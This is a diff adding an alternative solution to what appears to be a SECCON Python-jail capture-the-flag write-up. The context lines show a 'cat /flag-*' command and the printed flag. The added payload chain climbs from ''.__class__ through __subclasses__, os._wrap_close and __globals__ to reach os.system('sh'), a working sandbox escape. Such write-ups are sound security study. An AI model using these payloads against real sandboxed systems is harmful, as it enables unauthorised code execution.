@@ -310,3 +310,40 @@ jail> {}[lambda d:[*d][0].__getattribute__(d[[*d][0]]),0]
 {}[[s:=ex.args[0]] and s[0],s[1]('cat /flag-*')]
 jail> jail> jail> jail> jail> jail> jail> jail> SECCON{Pyth0n_was_m4de_for_jail_cha1lenges}
 ```
+
+@golden:
+
+Save the previous `ex` into `ex.args` and recover it:
+
+```python
+{}[lambda f: ''.__class__,ex]
+{}[[x:=ex.args[0],x][0][0](x[1])]
+{}[lambda f: f.__base__,ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
+{}[[x:=ex.args[0],x][0][0](x[1])]
+{}[lambda f: f.__subclasses__(),ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],[f[2](f[1])[0]][0]]
+{}[*[x:=ex.args[0],x][0][0](x[1])] # edited to unpack subclasses
+{}[lambda f: [c for c in f if 'wrap_close' in ''.__class__(c)][0],ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],[f[2](f[1])[0]][0]]
+{}[[x:=ex.args[0],x][0][0](x[1])]
+{}[lambda f: f.__init__,ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
+{}[[x:=ex.args[0],x][0][0](x[1])]
+{}[lambda f: f.__globals__['sys'],ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
+{}[[x:=ex.args[0],x][0][0](x[1])]
+{}[lambda f: f.modules['os'],ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
+{}[[x:=ex.args[0],x][0][0](x[1])]
+{}[lambda f: f.system('sh'),ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
+{}[[x:=ex.args[0],x][0][0](x[1])]
+```
